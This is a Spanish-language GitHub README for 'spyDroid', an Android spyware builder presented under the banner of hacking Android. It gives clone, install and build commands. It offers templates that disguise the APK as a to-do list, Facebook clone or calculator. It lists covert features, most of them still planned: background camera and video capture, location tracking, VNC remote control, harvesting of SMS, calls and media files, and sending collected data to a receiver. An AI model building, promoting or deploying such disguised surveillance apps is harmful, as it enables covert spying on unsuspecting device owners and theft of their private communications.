<!--
  Copyright (C) 2024 Daniel Gómez (Less)

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program. If not, see <https://www.gnu.org/licenses/>.
-->

![banner) (1)](https://github.com/user-attachments/assets/743b8003-f09b-4c92-b3a3-f92d5bd23d22)


<p align="center">
    <img src="https://github.com/user-attachments/assets/591e2a51-30a1-4844-8ac1-12a751967c86">
</p>


<p align="center">
    <img src="https://github.com/user-attachments/assets/df3f0def-babd-495f-ae17-3dc649d76b34" width="180" height="180">
</p>

<h3 align="center">¿Hacking android? ¡Yoo-hoo!</h3>


<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/gothic_divider_09.gif" width="1000">
</p>

<br>

> [!IMPORTANT]
> ####  Los siguientes pasos son para sistemas operativos basados en linux

## 1. [`Guia de instalación`](#guía-de-instalación)  
    
  #### 1.1. [`Clone el proyecto`](#clone-el-proyecto)
     
  #### 1.2. [`Cambie de directorio`](#cambie-de-directorio-al-del-proyecto)

  #### 1.3. [`Instale dependencias`](#instale-las-dependencias)

## 2. [`Compilación y uso de scripts`](#compilación-y-uso-de-scripts)

  #### 2.1. [`Flags de script.sh`](#flags-de-el-scriptsh)

  #### 2.2. [`Uso de script.sh`](#uso-de-scriptsh)     

   ##### 2.2.1. [`Plantillas por defecto`](#plantillas-por-defecto)
        
   ##### 2.2.2. [`Use una plantilla`](#use-una-plantilla)

 #### 2.3. [`Compilación de el APK`](#compilación-de-el-apk)

## 3. [`Cree un APK personalizado`](#cree-un-apk-personalizado)

  #### 3.1. [`Instale android studio`](#instale-android-studio)
   
  #### 3.2. [`Siga el contenido del post`](#siga-el-contenido-de-este-post)

## 4. [`Especificaciones técnicas`](#especificaciones-técnicas)

  #### 4.1. [`Features`](#features)
  
  #### 4.2. [`Arquitectura de módulos`](#arquitectura-de-módulos)

  #### 4.3. [`Arquitectura de base de dados`](#arquitectura-de-base-de-datos)

<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/text_red_divider_03.png" width="1000">
</p>

<br>

# Guía de instalación:

<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/gothic_divider_07.gif" width="1000">
</p>

## Clone el proyecto
    
    git clone https://github.com/Less-dev/spyDroid

## Cambie de directorio al del proyecto

    cd spyDroid

## Instale las dependencias
    
    chmod +x script.sh && ./script.sh -i

<br>

# Compilación y uso de scripts

<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/gothic_divider_07.gif" width="1000">
</p>

## Flags de script.sh

| Flag | Description         |  Require a parameter |
|------|---------------------|---------------------------------------------|
| -i   | Install the necessary resources to run the software| no |
| -t  |  Change the application template        |  yes |
| -c   | Compile the project and generate the APK        | no |

## Uso de script.sh

<p align="center">
<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="1000">
</p>

<br>

> [!NOTE]
> Verifique es el archivo script.sh tenga permisos de ejecución

<br>

### Plantillas por defecto

| Name Templates     | Description              | Version       |
|-----------|--------------------------|---------------|
| default   | A to-do list application  | 0.0.1-alpha   |
| facebook  | Facebook clone            | 0.1.0-alpha   |
| calculator| Calculator application    | 0.0.0-alpha   |
| sample    | Sample application        | 0.0.0-alpha   |

<br>

### Use una plantilla

    ./script.sh -t "name-template"


### Compilación de el APK

    ./script.sh -c

<br> 

# Cree un APK personalizado

<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/gothic_divider_07.gif" width="1000">
</p>

## Instale Android Studio

<h3 style="display: inline;">Click aquí  <img src="https://media.tenor.com/YziWYkqZndYAAAAi/dm4uz3-foekoe.gif" alt="Thumb pointing down" height="35" width="35"> </h3>

[![Watch this video](https://img.youtube.com/vi/tdkjCZ03Aj4/0.jpg)](https://www.youtube.com/watch?v=tdkjCZ03Aj4)

## Siga el contenido de este post
    

<h3 style="display: inline;"><img src="https://media.tenor.com/CsqnkjKnojgAAAAi/dm4uz3-foekoe.gif" height="35" width="35">   <a href="https://less-dev.github.io/src/blog/post_02.html" target="_blank"> Post</a> </h3>

<br>

# Especificaciones técnicas

<p align="center">
<img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/gothic_divider_07.gif" width="1000">
</p>

## Features

- [ ] **Feature-location**: This feature requests location permission, based on which it obtains the device's geographic coordinates.

- [x] **Feature-vnc**: This feature was compiled into a module called `feature-vnc`, taken from the [droidvnc](https://github.com/bk138/droidVNC-NG) repository.

- [ ] **Feature-camera**: This feature is a service that will run in the background, attempting to capture photos in real time.

- [ ] **Feature-video**: This feature is a service that will attempt to record videos with the device’s front camera in real time.

- [ ] **Feature-multimedia**: This feature is a service that will attempt to quickly gather all the multimedia files it can find and save them.

- [ ] **Feature-sms**: This functionality aims to capture all text messages on the device, from the oldest to those received subsequently.

- [ ] **Feature-ipAddress**: This feature aims to obtain an instance of all IP addresses of the device.

- [ ] **Feature-calls**: This feature aims to obtain an instance of all real-time calls that occur from the moment permission is granted.

- [ ] **Feature-shareData**: This feature will share all the collected data by encrypting it and sending it to a receiver (local).

<br>

> [!NOTE]
> arquitecturas en version `alpha`

## Arquitectura de módulos

![archithecture_modules](https://github.com/user-attachments/assets/9bf1b892-003c-4eb7-a3f1-3ca03e137d8e)

## Arquitectura de base de datos

> [!NOTE]
> TODO

<br>

<p align="center">
    <img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/glitch_divider_11.gif" width="1000" height="5">
</p>

<br>

<div align="center">
    <img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/text_red_divider_09.gif">
    <img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/text_red_divider_10.gif">
</div>

> [!WARNING]
> ####  El desarrollador de este software no asume ninguna responsabilidad por cualquier error, pérdida o problema que pueda surgir del uso del mismo. Utilícelo bajo su responsabilidad.
<br>

<p align="center">
    <img src="https://github.com/user-attachments/assets/0a483af2-fcde-4494-b435-0adea89a4a6e">
</p>


<p align="center">
    <img src="https://raw.githubusercontent.com/Less-dev/gifs/master/DIVIDERS/medieval_divider_05.png" width="1000">
</p>

